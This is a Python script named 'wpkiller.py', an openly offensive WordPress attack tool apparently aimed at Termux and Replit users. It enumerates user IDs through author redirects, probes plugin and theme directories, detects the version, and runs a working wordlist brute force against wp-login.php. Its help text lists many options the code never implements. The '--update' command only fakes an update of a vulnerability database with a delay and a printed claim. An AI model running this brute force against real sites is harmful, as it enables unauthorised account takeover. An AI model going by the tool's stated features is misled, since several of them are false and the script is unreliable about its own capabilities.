import requests
from bs4 import BeautifulSoup
import sys
import time

# Tool banner
def show_banner():
    print("""
    ██╗    ██╗██████╗ ██╗██╗     ██╗     ██╗     ███████╗██████╗ 
    ██║    ██║██╔══██╗██║██║     ██║     ██║     ██╔════╝██╔══██╗
    ██║ █╗ ██║██████╔╝██║██║     ██║     ██║     █████╗  ██████╔╝
    ██║███╗██║██╔═══╝ ██║██║     ██║     ██║     ██╔══╝  ██╔══██╗
    ╚███╔███╔╝██║     ██║███████╗███████╗███████╗███████╗██║  ██║
     ╚══╝╚══╝ ╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
     
    Designed for Termux and Replit
    """)

# Help menu
def show_help():
    print("""
    Usage: python wpkiller.py [OPTIONS]

    Normal Commands:
    -s, --scan        Scan target website for vulnerabilities
    -u, --users       Enumerate users
    -p, --plugins     Enumerate plugins
    -t, --themes      Enumerate themes
    -v, --version     Detect WordPress version
    -bf, --bruteforce Start brute force attack
    --no-ssl          Skip SSL certificate checks
    --update          Update the tool and vulnerability database
    -h, --help        Display this help message
    
    Advanced Commands:
    --proxy           Use a proxy server
    --enumerate       Choose specific enumerations (users, plugins, themes)
    --random-agent    Use a random user-agent string
    --wp-content-dir  Specify WordPress content directory
    --wp-plugins-dir  Specify WordPress plugins directory
    --wp-themes-dir   Specify WordPress themes directory
    --user-agent      Specify a custom user-agent string
    --exclude-content-based Exclude content-based results
    --request-interval Set delay between requests
    --ignore-main-redirects Ignore redirects of the main URL
    --no-cache        Disable cache for requests
    --max-threads     Set maximum number of threads
    """)

# Function to scan WordPress version
def scan_version(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        meta = soup.find("meta", {"name": "generator"})
        
        if meta and "WordPress" in meta['content']:
            version = meta['content'].split(" ")[1]
            print(f"[+] Detected WordPress version: {version}")
        else:
            print("[-] WordPress version not found.")
    except Exception as e:
        print(f"Error: {e}")

# Function to enumerate users
def enumerate_users(url):
    print(f"Enumerating users for {url}...")
    try:
        for i in range(1, 10):  # Trying IDs from 1 to 10
            user_url = f"{url}/?author={i}"
            response = requests.get(user_url, allow_redirects=True)
            
            if response.history and response.history[0].status_code == 301:
                print(f"[+] User {i} found at {response.url}")
            else:
                print(f"[-] User {i} not found")
    except Exception as e:
        print(f"Error: {e}")

# Function to enumerate plugins
def enumerate_plugins(url):
    print(f"Enumerating plugins for {url}...")
    try:
        response = requests.get(url + '/wp-content/plugins/')
        if response.status_code == 200:
            print("[+] Plugin directory accessible!")
        else:
            print("[-] Plugin directory not accessible.")
    except Exception as e:
        print(f"Error: {e}")

# Function to enumerate themes
def enumerate_themes(url):
    print(f"Enumerating themes for {url}...")
    try:
        response = requests.get(url + '/wp-content/themes/')
        if response.status_code == 200:
            print("[+] Theme directory accessible!")
        else:
            print("[-] Theme directory not accessible.")
    except Exception as e:
        print(f"Error: {e}")

# Simple brute force function for login
def brute_force_login(url, username, wordlist_path):
    login_url = f"{url}/wp-login.php"
    try:
        with open(wordlist_path, 'r') as f:
            passwords = f.read().splitlines()

        for password in passwords:
            print(f"[*] Trying {password}...")
            data = {'log': username, 'pwd': password}
            response = requests.post(login_url, data=data)

            if "Invalid username" not in response.text and "Invalid password" not in response.text:
                print(f"[+] Login successful with {password}")
                break
            time.sleep(1)
    except Exception as e:
        print(f"Error: {e}")

# Skip SSL verification
def skip_ssl(url):
    try:
        response = requests.get(url, verify=False)
        print(f"[+] SSL verification skipped for {url}.")
    except Exception as e:
        print(f"Error: {e}")

# Proxy functionality
def use_proxy(url, proxy_url):
    try:
        proxies = {"http": proxy_url, "https": proxy_url}
        response = requests.get(url, proxies=proxies)
        print(f"[+] Proxy used: {proxy_url}. Response status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

# Simulate updating tool and vulnerability database
def update_tool():
    print("Checking for updates...")
    time.sleep(2)
    print("[+] Tool and vulnerability database are up to date.")

# Command-line interface
if len(sys.argv) < 2:
    show_help()
    sys.exit(1)

show_banner()

option = sys.argv[1]

if option in ['-h', '--help']:
    show_help()
elif option in ['-s', '--scan']:
    if len(sys.argv) < 3:
        print("Please provide a URL to scan.")
    else:
        url = sys.argv[2]
        scan_version(url)
elif option in ['-u', '--users']:
    if len(sys.argv) < 3:
        print("Please provide a URL to enumerate users.")
    else:
        url = sys.argv[2]
        enumerate_users(url)
elif option in ['-p', '--plugins']:
    if len(sys.argv) < 3:
        print("Please provide a URL to enumerate plugins.")
    else:
        url = sys.argv[2]
        enumerate_plugins(url)
elif option in ['-t', '--themes']:
    if len(sys.argv) < 3:
        print("Please provide a URL to enumerate themes.")
    else:
        url = sys.argv[2]
        enumerate_themes(url)
elif option in ['-v', '--version']:
    if len(sys.argv) < 3:
        print("Please provide a URL to detect the WordPress version.")
    else:
        url = sys.argv[2]
        scan_version(url)
elif option in ['-bf', '--bruteforce']:
    if len(sys.argv) < 5:
        print("Please provide a URL, username, and wordlist path for brute force attack.")
    else:
        url = sys.argv[2]
        username = sys.argv[3]
        wordlist_path = sys.argv[4]
        brute_force_login(url, username, wordlist_path)
elif option == '--no-ssl':
    if len(sys.argv) < 3:
        print("Please provide a URL to skip SSL verification.")
    else:
        url = sys.argv[2]
        skip_ssl(url)
elif option == '--proxy':
    if len(sys.argv) < 4:
        print("Please provide a URL and proxy server.")
    else:
        url = sys.argv[2]
        proxy_url = sys.argv[3]
        use_proxy(url, proxy_url)
elif option == '--update':
    update_tool()
else:
    print("Unknown command. Use --help to see available options.")
